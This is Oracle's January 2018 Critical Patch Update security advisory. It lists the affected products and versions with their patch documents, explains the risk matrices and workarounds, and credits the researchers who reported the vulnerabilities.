=== Content from www.oracle.com_d2753d38_20250111_113008.html ===


* [Skip to content](#maincontent)
* [Accessibility Policy](https://www.oracle.com/corporate/accessibility/)

Products
Industries
Resources
Customers
Partners
Developers
Company

Close Search

Search Oracle.com

* QUICK LINKS
* [Oracle Cloud Infrastructure](/cloud/)
* [Oracle Fusion Cloud Applications](/applications/)
* [Oracle Database](/database/technologies/)
* [Download Java](/java/technologies/downloads/)
* [Careers at Oracle](/careers/)

Search

[Country
![]()](/countries-list.html#countries)

View Accounts

Back
Cloud Account
[Sign in to Cloud](/cloud/sign-in.html)
[Sign Up for Free Cloud Tier](/cloud/free/)

Oracle Account

* [Sign-In](https://www.oracle.com/webapps/redirect/signon?nexturl=)
* [Create an Account](https://profile.oracle.com/myprofile/account/create-account.jspx)

* [Help](/corporate/contact/help.html)
* Sign Out

[Contact Sales](/corporate/contact/ "Contact Sales")

[Menu

Menu](/global-menu-v2/)

* [Security Alerts](/security-alerts/)

# Oracle Critical Patch Update Advisory - January 2018

## Oracle Critical Patch Update Advisory - January 2018

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

The January 2018 Critical Patch Update provides fixes for certain Oracle products for the Spectre (CVE-2017-5753, CVE-2017-5715) and Meltdown (CVE-2017-5754) Intel processor vulnerabilities. Please refer to this Advisory and the [Addendum to the January 2018 Critical Patch Update Advisory for Spectre and Meltdown](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2347948.1) MOS note (Doc ID 2347948.1).

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 238 new security fixes across the product families listed below. Please note that a MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at [January 2018 Critical Patch Update: Executive Summary and Analysis.](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2338411.1)

### Affected Products and Patch Information

Security vulnerabilities addressed by this Critical Patch Update affect the products listed below. The product area is shown in the Patch Availability Document column. Please click on the links in the Patch Availability Document column below to access the documentation for patch availability information and installation instructions.

| Affected Products and Versions | Patch Availability Document |
| --- | --- |
| [Agile Material and Equipment Management for Pharmaceuticals, versions 9.3.3, 9.3.4](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Application Express, versions prior to 5.1.4.00.08](#AppendixDB) | [Database](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Converged Commerce, version 16.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [Hyperion BI+, version 11.1.2.4](#AppendixHYP) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Hyperion Data Relationship Management, version 11.1.2.4.330](#AppendixHYP) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Integrated Lights Out Manager (ILOM), versions 3.x, 4.x](#AppendixSUNS) | [Systems](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336753.1) |
| [Java Advanced Management Console, version 2.8](#AppendixJAVA) | [Java SE](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337155.1) |
| [Java ME SDK, version 8.3](#AppendixJME) | [Java ME](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2347376.1) |
| [JD Edwards EnterpriseOne Tools, version 9.2](#AppendixJDE) | [JD Edwards](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [MICROS Handheld Terminal, versions Prior to BSP 02.13.0701 (070116)](#AppendixHOSP) | [MICROS Handheld Terminal](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2331413.1) |
| [MICROS Relate CRM Software, versions 10.8.x, 11.4.x](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [MICROS Retail XBRi Loss Prevention, versions 10.0.1, 10.5.0, 10.6.0, 10.7.0, 10.8.0, 10.8.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [MySQL Connectors, versions 5.3.9 and prior, 6.9.9 and prior, 6.10.4 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336646.1) |
| [MySQL Enterprise Monitor, versions 3.3.6.3293 and prior, 3.4.4.4226 and prior, 4.0.0.5135 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336646.1) |
| [MySQL Server, versions 5.5.58 and prior, 5.6.38 and prior, 5.7.20 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336646.1) |
| [Oracle Access Manager, versions 10.1.4.3.0, 11.1.2.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Agile Engineering Data Management, versions 6.1.3, 6.2.0, 6.2.1](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Oracle Agile PLM, versions 9.3.3, 9.3.4, 9.3.5, 9.3.6](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Oracle Agile PLM MCAD Connector, versions 3.3, 3.4, 3.5, 3.6](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Oracle Argus Safety, versions 7.x, 8.0.x, 8.1](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336739.1) |
| [Oracle Autovue for Agile Product Lifecycle Management, versions 21.0.0, 21.0.1](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Oracle Banking Corporate Lending, versions 12.3.0, 12.4.0](#AppendixIFLX) | [Oracle Financial Services Applications](https://support.oracle.com/) |
| [Oracle Banking Payments, versions 12.3.0, 12.4.0](#AppendixIFLX) | [Oracle Financial Services Applications](https://support.oracle.com/) |
| [Oracle Business Intelligence Enterprise Edition, versions 11.1.1.7.0, 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Communications Application Session Controller, version 3.x](#AppendixCGBU) | [Oracle Communications Application Session Controller](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2339442.1) |
| [Oracle Communications BRM - Elastic Charging Engine, version 7.5](#AppendixCGBU) | [Oracle Communications BRM - Elastic Charging Engine](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2339444.1) |
| [Oracle Communications Convergent Charging Controller, version 6.0](#AppendixCGBU) | [Oracle Communications Convergent Charging Controller](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2338482.1) |
| [Oracle Communications Network Charging and Control, version 6.0](#AppendixCGBU) | [Oracle Communications Network Charging and Control](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2338482.1) |
| [Oracle Communications Order and Service Management, versions 7.2.4.1.x, 7.2.4.2.x, 7.3.0.1.x, 7.3.0.x.x](#AppendixCGBU) | [Oracle Communications Order and Service Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2338469.1) |
| [Oracle Communications Services Gatekeeper, versions 5.1, 6.0](#AppendixCGBU) | [Oracle Communications Services Gatekeeper](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2339036.1) |
| [Oracle Communications Unified Inventory Management, versions 7.2.4.2.x, 7.3](#AppendixCGBU) | [Oracle Communications Unified Inventory Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2338490.1) |
| [Oracle Communications User Data Repository, versions 10.x, 12.x](#AppendixCGBU) | [Oracle Communications User Data Repository](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2339445.1) |
| [Oracle Database Server, versions 11.2.0.4, 12.1.0.2, 12.2.0.1](#AppendixDB) | [Database](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Directory Server Enterprise Edition, version 11.1.1.7.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle E-Business Suite, versions 12.1.1, 12.1.2, 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, 12.2.7](#AppendixEBS) | [E-Business Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2334374.1) |
| [Oracle Endeca Information Discovery Integrator, versions 3.1.0, 3.2.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Financial Services Analytical Applications Infrastructure, versions 7.3.5.x, 8.0.x](#AppendixIFLX) | [Oracle Financial Services Analytical Applications Infrastructure](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2311616.1) |
| [Oracle Financial Services Analytical Applications Reconciliation Framework, version 8.0.x](#AppendixIFLX) | [Oracle Financial Services Analytical Applications Reconciliation Framework](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2348473.1) |
| [Oracle Financial Services Asset Liability Management, versions 6.1.x, 8.0.x](#AppendixIFLX) | [Oracle Financial Services Asset Liability Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337802.1) |
| [Oracle Financial Services Balance Sheet Planning, version 8.0.x](#AppendixIFLX) | [Oracle Financial Services Balance Sheet Planning](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2345682.1) |
| [Oracle Financial Services Funds Transfer Pricing, versions 6.1.x, 8.0.x](#AppendixIFLX) | [Oracle Financial Services Funds Transfer Pricing](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337127.1) |
| [Oracle Financial Services Hedge Management and IFRS Valuations, version 8.0.x](#AppendixIFLX) | [Oracle Financial Services Hedge Management and IFRS Valuations](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337125.1) |
| [Oracle Financial Services Liquidity Risk Management, version 8.0.x](#AppendixIFLX) | [Oracle Financial Services Liquidity Risk Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337244.1) |
| [Oracle Financial Services Loan Loss Forecasting and Provisioning, version 8.0.x](#AppendixIFLX) | [Oracle Financial Services Loan Loss Forecasting and Provisioning](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337125.1) |
| [Oracle Financial Services Market Risk, version 8.0.x](#AppendixIFLX) | [Oracle Financial Services Market Risk](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2346189.1) |
| [Oracle Financial Services Market Risk Measurement and Management, version 8.0.5](#AppendixIFLX) | [Oracle Financial Services Market Risk Mesurement and Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2346186.1) |
| [Oracle Financial Services Price Creation and Discovery, version 8.0.5](#AppendixIFLX) | [Oracle Financial Services Price Creation And Discovery](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337134.1) |
| [Oracle Financial Services Profitability Management, versions 6.1.x, 8.0.x](#AppendixIFLX) | [Oracle Financial Services Profitability Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337127.1) |
| [Oracle FLEXCUBE Direct Banking, versions 12.0.2, 12.0.3](#AppendixIFLX) | [Oracle Financial Services Applications](https://support.oracle.com/) |
| [Oracle FLEXCUBE Universal Banking, versions 11.3.0, 11.4.0, 11.5.0, 11.6.0, 11.7.0, 12.0.1, 12.0.2, 12.0.3, 12.1.0, 12.2.0, 12.3.0, 12.4.0](#AppendixIFLX) | [Oracle Financial Services Applications](https://support.oracle.com/) |
| [Oracle Fusion Applications, versions 11.1.2 through 11.1.9](#AppendixFAPP) | [Fusion Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2224172.1) |
| [Oracle Fusion Middleware, versions 11.1.1.7, 11.1.1.9, 11.1.2.3, 12.1.3.0, 12.2.1.2, 12.2.1.3](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Health Sciences Empirica Inspections, version 1.0.1.1](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336739.1) |
| [Oracle Health Sciences Empirica Signal, version 8.0.1.0](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336739.1) |
| [Oracle Hospitality Cruise Dining Room Management, version 8.0.78](#AppendixHOSP) | [Oracle Hospitality Cruise Dining Room Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2332388.1) |
| [Oracle Hospitality Cruise Fleet Management, version 9.0.4.0](#AppendixHOSP) | [Oracle Hospitality Cruise Fleet Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2332384.1) |
| [Oracle Hospitality Cruise Shipboard Property Management System, version 7.3.874](#AppendixHOSP) | [Oracle Hospitality Cruise Shipboard Property Management System](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2334015.1) |
| [Oracle Hospitality Guest Access, versions 4.2.0, 4.2.1](#AppendixHOSP) | [Oracle Hospitality Guest Access](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2331699.1) |
| [Oracle Hospitality Labor Management, versions 8.5.1, 9.0.0](#AppendixHOSP) | [Oracle Hospitality Labor Management](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2328836.1) |
| [Oracle Hospitality Reporting and Analytics, versions 8.5.1, 9.0.0](#AppendixHOSP) | [Oracle Hospitality Reporting and Analytics](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2328836.1) |
| [Oracle Hospitality Simphony, versions 2.7, 2.8, 2.9](#AppendixHOSP) | [Oracle Hospitality Simphony](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2332522.1) |
| [Oracle HTTP Server, versions 11.1.1.7.0, 11.1.1.9.0, 12.1.3.0.0, 12.2.1.2.0, 12.2.1.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Hyperion Planning, version 11.1.2.4.007](#AppendixHYP) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Identity Manager, version 11.1.2.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Identity Manager Connector, versions 9.0.4.20.6, 9.0.4.21.0, 9.0.4.25.4](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Internet Directory, versions 11.1.1.7.0, 11.1.1.9.0, 12.2.1.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle iPlanet Web Server, version 7.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Java SE, versions 6u171, 7u161, 8u152, 9.0.1](#AppendixJAVA) | [Java SE](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337155.1) |
| [Oracle Java SE Embedded, version 8u151](#AppendixJAVA) | [Java SE](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337155.1) |
| [Oracle JDeveloper, versions 11.1.1.2.4, 11.1.1.7.0, 11.1.1.7.1, 11.1.1.9.0, 11.1.2.4.0, 12.1.3.0.0, 12.2.1.2.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle JRockit, version R28.3.16](#AppendixJAVA) | [Java SE](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2337155.1) |
| [Oracle Mobile Security Suite, version 3.0.1](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle Retail Assortment Planning, versions 14.1.3, 15.0.3, 16.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [Oracle Retail Convenience and Fuel POS Software, version 2.1.132](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [Oracle Retail Customer Management and Segmentation Foundation, versions 16.0.x](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [Oracle Retail Fiscal Management, version 14.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [Oracle Retail Merchandising System, version 16.0](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [Oracle Retail Workforce Management, versions 1.60.7, 1.64.0](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336262.1) |
| [Oracle Secure Global Desktop (SGD), version 5.3](#AppendixOVIR) | [Virtualization](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2339562.1) |
| [Oracle Transportation Management, versions 6.2.11, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5, 6.3.6, 6.3.7, 6.4.1, 6.4.2, 6.4.3](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Oracle Tuxedo System and Applications Monitor, version 12.1.3.0.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle VM VirtualBox, versions prior to 5.1.32, prior to 5.2.6](#AppendixOVIR) | [Virtualization](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2339562.1) |
| [Oracle WebCenter Content, versions 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle WebCenter Portal, versions 11.1.1.9.0, 12.2.1.2.0, 12.2.1.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle WebCenter Sites, version 11.1.1.8.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle WebLogic Server, versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.2.0, 12.2.1.3.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1) |
| [Oracle X86 Servers, versions SW 1.x, SW 2.x](#AppendixSUNS) | [Systems](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336753.1) |
| [OSS Support Tools, versions prior to 2.11.33](#AppendixTOOL) | [Support Tools](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2345955.1) |
| [PeopleSoft Enterprise FIN Supply Chain Portal Pack Argentina, version 9.1](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [PeopleSoft Enterprise FIN Supply Chain Portal Pack Brazil, version 9.1](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [PeopleSoft Enterprise FSCM, version 9.2](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [PeopleSoft Enterprise HCM Human Resources, versions 9.1, 9.2](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [PeopleSoft Enterprise PeopleTools, versions 8.54, 8.55, 8.56](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [PeopleSoft Enterprise PRTL Interaction Hub, version 9.1.00](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [PeopleSoft Enterprise SCM eProcurement, versions 9.1, 9.2](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [PeopleSoft Enterprise SCM Purchasing, version 9.2](#AppendixPS) | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Primavera Unifier, versions 10.x, 15.x, 16.x, 17.x](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336404.1) |
| [Siebel Applications, versions 16.0, 17.0](#AppendixSECR) | [Siebel](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336519.1) |
| [Solaris, versions 10, 11.3](#AppendixSUNS) | [Systems](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336753.1) |
| [Sun ZFS Storage Appliance Kit (AK), versions prior to 8.7.13](#AppendixSUNS) | [Systems](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2336753.1) |

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Users running Java SE with a browser can download the latest release from [http://java.com](//java.com/). Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is [here](/security-alerts/cpujan2018verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in italics indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies.Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the only variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update fixes as soon as possible**. Critical Patch Update fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update January 2018 Availability Document, [My Oracle Support Note 2325393.1.](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2325393.1)

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](//www.oracle.com/support/policies.html) for further guidelines regarding support policies and phases of support.

### Credit Statement

The following people or organizations reported security vulnerabilities addressed by this Critical Patch Update to Oracle:

* Adam Willard of Blue Canopy: CVE-2018-2596, CVE-2018-2713
* Allen Reese: CVE-2018-2599
* Andrea Micalizzi aka rgod, working with Trend Micro's Zero Day Initiative: CVE-2018-2615, CVE-2018-2616, CVE-2018-2617
* Apostolos Giannakidis of Waratek : CVE-2018-2677
* Brandon Vincent: CVE-2018-2593
* Dhiraj Mishra: CVE-2018-2715
* Dmitrii Iudin aka @ret5et of ERPScan: CVE-2018-2605
* Dmitry Chastuhin of ERPScan: CVE-2018-2636
* Egidio Romano of Karma(In)Security: CVE-2018-2699
* Florian Ohlms of Daimler TSS: CVE-2018-2574
* Greg Hudson of MIT Kerberos team: CVE-2018-2629
* Himanshu Mehta: CVE-2018-2569
* Jeremy Buis of softwaresecured.com: CVE-2018-2625
* John Page (hyp3rlinx): CVE-2017-10273
* Juan Pablo Perez Etchegoyen of Onapsis: CVE-2018-2655, CVE-2018-2656
* Lukasz Mikula: CVE-2017-10068, CVE-2018-2651, CVE-2018-2652, CVE-2018-2653, CVE-2018-2695
* Lukasz Plonka of ING Services Polska: CVE-2018-2610
* Marc Heuse: CVE-2018-2710
* Marcin Wołoszyn of ING Services Polska: CVE-2018-2594, CVE-2018-2595
* Marek Janiczek of Prevenity: CVE-2018-2733
* Matej Tymes: CVE-2018-2579
* Michal Rydlo: CVE-2018-2641
* Mohammad Shah Bin Mohammad Esa of SEC Consult Vulnerability Lab: CVE-2018-2660, CVE-2018-2661
* Mohammed Nazim Rafiq: CVE-2018-2674
* Moritz Bechler: CVE-2018-2633, CVE-2018-2637
* Niklas Baumstark: CVE-2018-2693, CVE-2018-2694
* Niklas Baumstark via Beyond Security's SecuriTeam Secure Disclosure program: CVE-2018-2698
* Paolo Stagno aka VoidSec: CVE-2018-2658, CVE-2018-2659
* Red Hat Product Security: CVE-2018-2696, CVE-2018-2703
* Reha Esen from VeraSafe.com: CVE-2018-2642, CVE-2018-2643, CVE-2018-2644
* Reno Robert: CVE-2018-2676
* Rohit Varude: CVE-2018-2630
* Samandeep Singh of SEC Consult Vulnerability Lab: CVE-2018-2660, CVE-2018-2661
* Sebastian Fuchs of NTT Security: CVE-2018-2631, CVE-2018-2662
* Sherif Koussa of softwaresecured.com: CVE-2018-2625
* Spyridon Chatzimichail of OTE Hellenic Telecommunications Organization S.A.: CVE-2018-2567, CVE-2018-2570, CVE-2018-2571
* Sumit Khandelwal: CVE-2018-2711
* Travis Emmert of Exodus Intelligence: CVE-2018-2601
* Vasily Vasiliev of Trend Micro's Zero Day Initiative: CVE-2018-2685, CVE-2018-2686, CVE-2018-2687, CVE-2018-2688, CVE-2018-2689, CVE-2018-2690
* Vijay Saindane: CVE-2018-2630
* Zuozhi Fan: CVE-2018-2667, CVE-2018-2668

#### Security-In-Depth Contributors

Oracle acknowledges people who have contributed to our Security-In-Depth program (see [FAQ](/security-alerts/cpufaq.html)). People are acknowledged for Security-In-Depth contributions if they provide information, observations or suggestions pertaining to security vulnerability issues that result in significant modification of Oracle code or documentation in future releases, but are not of such a critical nature that they are distributed in Critical Patch Updates.

In this Critical Patch Update Advisory, Oracle recognizes the following for contributions to Oracle's Security-In-Depth program.:

* Adam Willard of Blue Canopy
* Alexander Mirosh of Hewlett Packard Enterprise
* Alvaro Munoz of Hewlett Packard Enterprise
* Appidi Saikumar Reddy
* Daniel Bleichenbacher of Google
* Olaf Kummer of CoreMedia
* SaifAllah benMassaoud (2 reports)

#### On-Line Presence Security Contributors

Oracle acknowledges people who have contributed to our On-Line Presence Security program (see [FAQ](/security-alerts/cpufaq.html)). People are acknowledged for contributions relating to Oracle's on-line presence if they provide information, observations or suggestions pertaining to security-related issues that result in significant modification to Oracle's on-line external-facing systems.

For this quarter, Oracle recognizes the following for contributions to Oracle's On-Line Presence Security program:

* Ali Wamim Khan
* Cameron Dawe of Spam404.com (2 reports)
* Chacko K Abraham
* Cole Woods
* Gourav Kumar Jha
* Ifrah Iman
* Joao F M Figueiredo
* Kenan Can
* Kenan Genc
* Li ChaoHan Bon
* Mohit Rawat (2 reports)
* Muhammad Uwais
* Richard Alviarez
* Sergius Low Jun Kai
* Sreedeep Ck Alavil of Kerala Police Cyber Dome Volunteers Commander
* Ugur Can Atasoy
* Unmesh Jore

### Critical Patch Update Schedule

